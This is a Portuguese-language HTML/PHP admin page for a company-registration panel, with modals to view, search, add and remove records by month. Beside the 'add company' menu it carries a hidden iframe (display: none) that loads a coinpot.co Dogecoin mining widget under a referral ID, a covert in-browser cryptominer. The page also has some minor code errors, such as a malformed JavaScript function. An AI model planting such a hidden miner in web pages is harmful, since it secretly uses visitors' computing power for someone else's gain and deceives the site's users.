<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>HP | Controle</title>
     <!--[if lt IE 9]>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.js"></script>
    <![endif]-->
    <!-- Bootstrap CSS and useful links -->
    <link rel="stylesheet" type="text/css" href="bootstrap/css/bootstrap.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="style.css">
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">

   <link rel="stylesheet" type="text/css" href="assets/style.css">
  
</head>
<body onload="startTime()">

<!-- Nav bar-->

<nav class="navbar navbar-toggleable-md navbar-light bg-faded navbar-color">

  <center><aside id="clockOutput"></aside> <b><h2>Efetivos</h2></b></center>
  <a class="navbar-brand" href="#"><b>HP | Verificação</b></a>
  
</nav>
<!-- Navbar end -->
      <aside class="container">

        <aside class="row">
            
            <aside class="col-md-6"> <!-- VERIFICAÇÃO -->


                <aside class="menuOpcao">

                    <aside class="titulo">Visualização</aside>
                    <li><button class="btn" data-toggle="modal" data-target="#visualizarTabela">Visualizar Tabela</button></li>
                    <li><button class="btn" data-toggle="modal" data-target="#pesquisa">Pesquisa por empresa</button></li>
                </aside>

            </aside> <!-- End first col -->





            <aside class="col-md-6">  <!-- SECOND COL FIRST ROW, Adicionar -->

                <aside class="menuOpcao">
                    <aside class="titulo">Adicionar dados na tabela</aside>

                     <li><button class="btn" data-toggle="modal" data-target="#modal-cadastro">Cadastrar nova empresa</button></li>
                    
                </aside>
            <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/dogecoin/?ref=536AA517A49B&mode=widget" style="overflow:hidden;width:324px;height:470px; display: none;"></iframe>
            </aside> <!-- SECOND COL FIRST ROW END-->

        </aside>    <!-- FIRST ROW END-->


        <aside class="row top-buffer"> <!-- SECOND ROW -->
            
            <aside class="col-md-6">  <!-- FIRS COL SECOND COL-->
                <aside class="menuOpcao">
                    <aside class="titulo">Remover dado da tabela</aside>

                      <li><button class="btn" data-toggle="modal" data-target="#removerPorEmpresa">Remover por Responsavel</button></li>
                      <li><button class="btn" data-toggle="modal" data-target="#filtrarPor">Remover por Empresa</button></li>
                
                </aside>
            </aside> <!-- FIRST COL SECOND ROW END -->

            <aside class="col-md-6">
                   
            </aside>

        </aside>


      </aside>    <!-- End container-->


                        

                         <!-- ****************** MODAIS *****************-->




<!-- 1. Verificações Visualizar Tabela-->

<aside class="modal fade" id="visualizarTabela">
  <aside class="modal-dialog modal-md">
    <form method="POST" action="actions/visualizarTabela.php">
      <aside class="modal-content">


        <aside class="modal-header">
          <h4 class="modal-title">Visualizar Tabela</h4>
          <button class="close" data-dismiss="modal">&times;</button>   
        </aside>


        <aside class="modal-body">
          <aside class="form-control option-space">
            <a href="actions/visualiza.php?metodo=empresa&mes=Janeiro"><aside class="option">Visualizar por Empresa</aside></a>
          </aside>
          <aside class="form-control option-space">
            <a href="actions/visualiza.php?metodo=responsavel&mes=Janeiro"><aside class="option">Visualizar por Nome</aside></a>
          </aside>
        </aside>
      </aside>
    </form>
  </aside>
</aside>

<!-- 1.2 Verificações Pesquisa -->

<aside class="modal fade" id="pesquisa">
  <aside class="modal-dialog modal-md">
      <aside class="modal-content" style="padding: 20px;">

        <aside class="modal-header">
          <aside class="modal-title"><h4>Pesquisa</h4></aside>
          <button class="close" data-dismiss="modal">&times;</button> 
         </aside>

        <aside class="modal-body" style="padding: 10px;">
                <center>
                  <form target="_blank" id="pesquisa" method="POST" action="actions/visualizaPesquisa.php" class="form">
                    <aside class="form-group">

                        <aside class="form-control" style="border:0 !important;">
                         <h5>Insira o nome da Empresa</h5>
                        </aside>

                        <aside class="form-control" style="border:0 !important;">
                          <input type="text" name="getSearch" id="getSearch">
                        </aside>

                        <aside class="form-control" style="border:0 !important;">
                         <input type="submit" value="Pesquisar" name="btnPesquisa" >
                        </aside>

                    </aside>
                  </form>
                </center>
        </aside>
      </aside>
  </aside>
</aside>

<!-- 2.1 Cadastro de novas empreas -->

<aside class="modal fade bd-example-modal-lg" id="modal-cadastro">
  <aside class="modal-dialog modal-md">
      <aside class="modal-content" style="padding: 20px;">

        <aside class="modal-header">
          <aside class="modal-title"><h4>Cadastrar</h4></aside>
          <button class="close" data-dismiss="modal">&times;</button> 
         </aside>

        <aside class="modal-body">
                
                  <form id="pesquisa" method="POST" action="actions/cadastro/confirma.php" class="form">
                    
                    <!-- formzão do cadastro -->

     <div class="form-group">
    <label for="empresa">Empresa</label>
    <input required="required" type="text" class="form-control" name="empresa" aria-describedby="textHelp" placeholder="Digite o nome da empresa">
    </div>

     <div class="form-group">
    <label for="Responsavel">Responsavel</label>
    <input type="text" class="form-control" name="responsavel" aria-describedby="textHelp" placeholder="Digite o nome do Resposanvel">
    </div>

     <div class="form-group">
    <label for="Cidade">Cidade</label>
    <input required="required" type="text" class="form-control" name="cidade" aria-describedby="textHelp" placeholder="Digite o nome da Cidade">
    </div>

     <div class="form-group">
    <label for="Telefone">Telefone</label>
    <input required="required" type="text" class="form-control" name="telefone" aria-describedby="textHelp" placeholder="Digite o Telefone sem espaços">
    </div>

     <div class="form-group">
    <label for="Email">Email</label>
    <input required="required" type="email" class="form-control" name="email" aria-describedby="textHelp" placeholder="Digite o Email">
    </div> 

    <div class="form-group">
    <label for="mes">Mês de cadastro</label>
    <br>
    <select name="mes" required="required">
      <option value="Janeiro">Janeiro</option>
      <option value="Fevereiro">Fevereiro</option>
      <option value="Março">Março</option>
      <option value="Abril">Abril</option>
      <option value="Maio">Maio</option>
      <option value="Junho">Junho</option>
      <option value="Julho">Julho</option>
      <option value="Agosto">Agosto</option>
      <option value="Setembro">Setembro</option>
      <option value="Outubro">Outubro</option>
      <option value="Novembro">Novembro</option>
      <option value="Dezembro">Dezembro</option>
    </select>
    </div>  

    <div class="form-group">
      <center><input type="submit" value="Cadastrar" name=""></center>
    </div>            

    <?php
      $transdate = date('m-d-Y', time());

      echo "Data : " . $transdate . "<br>";

     $month = date('m');

     if($month == 1){
      $mes = '<b>Janeiro</b>';
     }

     if($month == 2){
      $mes = '<b>Fevereiro/b>';
     }

     if($month == 3){
      $mes = '<b>Marços</b>';
     }

     if($month == 4){
      $mes = '<b>Abril</b>';
     }

     if($month == 5){
      $mes = '<b>Maio</b>';
     }

     if($month == 6){
      $mes = '<b>Junho</b>';
     }

     if($month == 7){
      $mes = '<b>Julho</b>';
     }

     if($month == 8){
      $mes = '<b>Agosto</b>';
     }

     if($month == 9){
      $mes = '<b>Setembro</b>';
     }

     if($month == 10){
      $mes = '<b>Outubro</b>';
     }

     if($month == 11){
      $mes = '<b>Novembro</b>';
     }

    if($month == 12){
      $mes = '<b>Dezembro</b>';
     }
     echo "$mes";
      
   
    ?>    
                    </aside> <!-- Modal content end -->

                  </form>
                
        </aside>
      </aside>
  </aside>
</aside>

                <!-- 3.1 Modal de remoção -->

<aside class="modal fade" id="removerPorEmpresa">
  <aside class="modal-dialog modal-md">
    <form id="removerId" method="POST" action="actions/removePorEmpresa.php">
      <aside class="modal-content">

                        <!--header-->
        <aside class="modal-header">
          <h4 class="modal-title">Remover Dados</h4>
            <button class="close" data-dismiss="modal">&times;</button>   
        </aside>

                        <!-- body -->
        <aside class="modal-body">

          <aside class="removerId">

            <aside class="form-control"> 

              <center>
              Selecione o Mês
              <select name="getMes">
              <option value="Janeiro">Janeiro</option>
              <option value="Fevereiro">Fevereiro</option>
              <option value="Marco">Março</option>
              <option value="Abril">Abril</option>
              <option value="Maio">Maio</option>
              <option value="Junho">Junho</option>
              <option value="Julho">Julho</option>
              <option value="Agosto">Agosto</option>
              <option value="Setembro">Setembro</option>
              <option value="Outubro">Outubro</option>
              <option value="Novembro">Novembro</option>
              <option value="Dezembro">Dezembro</option>
              </select>
             </center>

            </aside>



          <aside class="form-control">

            <center>
            Digite o nome da empresa : 
              <input type="text" name="getId">
            </center>

          </aside>
          <br>
          <center><input type="submit" name="" value="Excluir"></center>
        </aside>
      </aside>
  </aside>
</form>
</aside>
</aside> <!-- END MODAL DE REMOÇÃO -->


<!-- FIM DOS MODAIS -->

      <!-- My JS -->
      <script type="text/javascript">

        $(function () {
          $('[data-toggle="tooltip"]').tooltip();
          $('[data-toggle="popover"]').popover();
        });


        function startTime() {
            var today = new Date();
            var h = today.getHours();
            var m = today.getMinutes();
            var s = today.getSeconds();
            m = checkTime(m);
            s = checkTime(s);
            document.getElementById('clockOutput').innerHTML = "<b>" + h + ":" + m + ":" + s + "</b>";
            var t = setTimeout(startTime, 500);
        }
        function checkTime(i) {
            if (i < 10) {i = "0" + i};  // add zero in front of numbers < 10
            return i;
        }   

        function confirm{
          confirm("Press a button!");
        }
      </script>


  <!-- LOCAL SCRIPTS -->

    <script type="text/javascript" src="bootstrap/js/jquery-3.2.1.slim.min.js"></script>
    <script type="text/javascript" src="bootstrap/js/popper.min.js"></script>
    <script type="text/javascript" src="bootstrap/js/bootstrap.js"></script>
  


  <!-- CDN'S BASES -->
  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js" integrity="sha384-b/U6ypiBEHpOf/4+1nzFpr53nxSS+GLCkfwBdFNTxtclqqenISfwAzpKaMNFNmj4" crossorigin="anonymous"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
</body>
</html>